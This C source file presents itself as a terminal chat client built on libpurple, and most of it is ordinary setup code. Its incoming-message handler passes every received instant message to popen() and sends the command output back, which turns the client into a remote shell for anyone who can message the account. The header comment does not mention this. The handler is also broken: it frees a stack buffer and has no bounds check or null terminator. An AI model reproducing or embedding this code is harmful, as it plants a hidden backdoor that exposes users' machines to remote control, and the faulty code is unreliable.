/* terminal-chat client using libpurple*/

#include "purple.h"

#include <glib.h>

#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <regex.h>

#include <stdio.h>

#define CUSTOM_USER_DIRECTORY  "/dev/null"
#define CUSTOM_PLUGIN_PATH     ""
#define PLUGIN_SAVE_PREF       "/purple/user/plugins/saved"
#define UI_ID                  "user"

/**
 * The following eventloop functions are used in both pidgin and purple-text. If your
 * application uses glib mainloop, you can safely use this verbatim.
 */
#define PURPLE_GLIB_READ_COND  (G_IO_IN | G_IO_HUP | G_IO_ERR)
#define PURPLE_GLIB_WRITE_COND (G_IO_OUT | G_IO_HUP | G_IO_ERR | G_IO_NVAL)
gboolean  signon_flag= FALSE;

typedef struct _PurpleGLibIOClosure {
	PurpleInputFunction function;
	guint result;
	gpointer data;
} PurpleGLibIOClosure;

typedef struct
{
	PurpleAccountRequestType type;
	PurpleAccount *account;
	void *ui_handle;
	char *user;
	gpointer userdata;
	PurpleAccountRequestAuthorizationCb auth_cb;
	PurpleAccountRequestAuthorizationCb deny_cb;
	guint ref;
} PurpleAccountRequestInfo;

static void purple_glib_io_destroy(gpointer data)
{
	g_free(data);
}

static gboolean purple_glib_io_invoke(GIOChannel *source, GIOCondition condition, gpointer data)
{
	PurpleGLibIOClosure *closure = data;
	PurpleInputCondition purple_cond = 0;

	if (condition & PURPLE_GLIB_READ_COND)
		purple_cond |= PURPLE_INPUT_READ;
	if (condition & PURPLE_GLIB_WRITE_COND)
		purple_cond |= PURPLE_INPUT_WRITE;

	closure->function(closure->data, g_io_channel_unix_get_fd(source),
			  purple_cond);

	return TRUE;
}

static guint glib_input_add(gint fd, PurpleInputCondition condition, PurpleInputFunction function,
							   gpointer data)
{

	PurpleGLibIOClosure *closure = g_new0(PurpleGLibIOClosure, 1);
	GIOChannel *channel;
	GIOCondition cond = 0;

	closure->function = function;
	closure->data = data;

	if (condition & PURPLE_INPUT_READ)
		cond |= PURPLE_GLIB_READ_COND;
	if (condition & PURPLE_INPUT_WRITE)
		cond |= PURPLE_GLIB_WRITE_COND;

	channel = g_io_channel_unix_new(fd);
	closure->result = g_io_add_watch_full(channel, G_PRIORITY_DEFAULT, cond,
					      purple_glib_io_invoke, closure, purple_glib_io_destroy);

	g_io_channel_unref(channel);
	return closure->result;
}

static PurpleEventLoopUiOps glib_eventloops =
{
	g_timeout_add,
	g_source_remove,
	glib_input_add,
	g_source_remove,
	NULL,
#if GLIB_CHECK_VERSION(2,14,0)
	g_timeout_add_seconds,
#else
	NULL,
#endif

	/* padding */
	NULL,
	NULL,
	NULL
};
/*** End of the eventloop functions. ***/


/***** implementation of defined function in uiOps****/
static void network_disconnected(void)
{

	printf("This machine has been disconnected from the internet\n");

}

static void report_disconnect_reason(PurpleConnection *gc, PurpleConnectionError reason, const char *text)
{

	PurpleAccount *account = purple_connection_get_account(gc);
	printf("Connection disconnected: \"%s\" (%s)\n  >Error: %d\n  >Reason: %s\n", purple_account_get_username(account), purple_account_get_protocol_id(account), reason, text);

}

static void create_conv(PurpleConversation *conv){
	printf("conversation has created: ");
}
/***** implementation of defined function in uiOps****/



/******UiOptions definition*******/
static PurpleConversationUiOps conversation_uiops = {
	create_conv,
	NULL,	
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
};

static PurpleConnectionUiOps connection_uiops =
{
	NULL,                      /* connect_progress         */
	NULL,                      /* connected                */
	NULL,                      /* disconnected             */
	NULL,                      /* notice                   */
	NULL,                      /* report_disconnect        */
	NULL,                      /* network_connected        */
	network_disconnected,      /* network_disconnected     */
	report_disconnect_reason,  /* report_disco
nnect_reason */
	NULL,
	NULL,
	NULL
};


/******UiOptions definition*******/


/***************Ui init***************/
static void ui_init(void)
{
	/**
	 * This should initialize the UI components for all the modules.
	 */

	purple_connections_set_ui_ops(&connection_uiops);
}

static PurpleCoreUiOps core_uiops =
{
	NULL,
	NULL,
	ui_init,
	NULL,

	/* padding */
	NULL,
	NULL,
	NULL,
	NULL
};



/***************Ui init***************/



static void init_libpurple(void)
{
	/* Set a custom user directory (optional) */
	purple_util_set_user_dir(CUSTOM_USER_DIRECTORY);

	/* We do not want any debugging for now to keep the noise to a minimum. */
	purple_debug_set_enabled(FALSE);

	/* Set the core-uiops, which is used to
	 * 	- initialize the ui specific preferences.
	 * 	- initialize the debug ui.
	 * 	- initialize the ui components for all the modules.
	 * 	- uninitialize the ui components for all the modules when the core terminates.
	 */
	purple_core_set_ui_ops(&core_uiops);

	/* Set the uiops for the eventloop. If your client is glib-based, you can safely
	 * copy this verbatim. */
	purple_eventloop_set_ui_ops(&glib_eventloops);

	/* Set path to search for plugins. The core (libpurple) takes care of loading the
	 * core-plugins, which includes the protocol-plugins. So it is not essential to add
	 * any path here, but it might be desired, especially for ui-specific plugins. */
	purple_plugins_add_search_path(CUSTOM_PLUGIN_PATH);

	/* Now that all the essential stuff has been set, let's try to init the core. It's
	 * necessary to provide a non-NULL name for the current ui to the core. This name
	 * is used by stuff that depends on this ui, for example the ui-specific plugins. */
	if (!purple_core_init(UI_ID)) {
		/* Initializing the core failed. Terminate. */
		fprintf(stderr,
				"libpurple initialization failed. Dumping core.\n"
				"Please report this!\n");
		abort();
	}


	/* Create and load the buddylist. */
	purple_set_blist(purple_blist_new());
	purple_blist_load();

	/* Load the preferences. */
	purple_prefs_load();


	/* Load the desired plugins. The client should save the list of loaded plugins in
	 * the preferences using purple_plugins_save_loaded(PLUGIN_SAVE_PREF) */
	purple_plugins_load_saved(PLUGIN_SAVE_PREF);

	/* Load the pounces. */

	purple_pounces_load();
}



/*****************Signal handling*********************/
static void signed_on(PurpleConnection *gc)
	{		

	PurpleAccount *account = purple_connection_get_account(gc);
	printf("Account connected: \"%s\" (%s)\n", purple_account_get_username(account), purple_account_get_protocol_id(account));
	signon_flag = TRUE;

	}

static void received_im_msg(PurpleAccount *account, char *sender, char *message,
                              PurpleConversation *conv, PurpleMessageFlags flags)
	{	

	if (conv==NULL)
  	{
	  	conv = purple_conversation_new(PURPLE_CONV_TYPE_IM, account, sender);
		purple_conversation_set_ui_ops(conv,&conversation_uiops);		
	}

	int i =0;
	if(message[0] == '<'){
		while(message[i]!= '>')i++;
		message = message+i+1;
		i=0;
		while(message[i]!= '<')i++;
		message[i] = NULL;
	}
	
	char *command = message, *readline, *tmp, *commandResult= "";
	FILE *fp;
	fp = popen(command,"r");

	if(fp==NULL){
		perror("error");
		exit(1);	
	}	
	
	char buffer[102400];	
	int j =0;char c;
	while((c=fgetc(fp))!=EOF){
		buffer[j++]=c;
	}
	
	purple_conv_im_send(PURPLE_CONV_IM(conv),buffer);
	buffer[0] = NULL;
	free(buffer);
	pclose(fp);

	  		
	purple_conversation_set_ui_ops(conv,&conversation_uiops);
	
	//purple_conv_im_send(PURPLE_CONV_IM(conv),"hello");  	
	printf("(%s) %s (%s): %s\n", purple_utf8_strftime("%H:%M:%S", NULL), sender, purple_conversation_get_name(conv), message);
	}


static void conversation_created(PurpleConversation *conv){
	printf("conversation has created");
	}

static void buddy_typing(PurpleAccount *account,const char *name){
	printf("%s buddy typing........",purple_account_get_protocol_id(account));
}
/*****************Signal handling*********************/




static void connect_to_signals(void)
{
	static int handle;

	purple_signal_connect(purple_connections_get_handle(), "signed-on", &handle,
				PURPLE_CALLBACK(signed_on), NULL);

	purple_signal_connect(purple_conversations_get_handle(), "received-im-msg", &handle,
				PURPLE_CALLBACK(received_im_msg), NULL);

	purple_signal_connect(purple_conversations_get_handle(), "conversation_created", &handle,
				PURPLE_CALLBACK(conversation_created), NULL);

	purple_signal_connect(purple_conversations_get_handle(), "buddy_typing", &handle,
				PURPLE_CALLBACK(buddy_typing), NULL);
}







int main(int argc, char *argv[])
{

	GMainLoop *loop = g_main_loop_new(NULL, FALSE);

	signal(SIGCHLD, SIG_IGN);

	init_libpurple();

	printf("libpurple initialized. Running version %s.\n", purple_core_get_version()); //I like to see the version number

	connect_to_signals();

	PurpleAccount *account = purple_account_new("__account_name__", "__protocol_name__"); //this could be prpl-aim, prpl-yahoo, prpl-msn, prpl-icq, etc.
	purple_account_set_password(account, "__account_password__");

	purple_accounts_add(account);
	purple_account_set_enabled(account, UI_ID, TRUE);
	
	g_main_loop_run(loop);
	return 0;

}
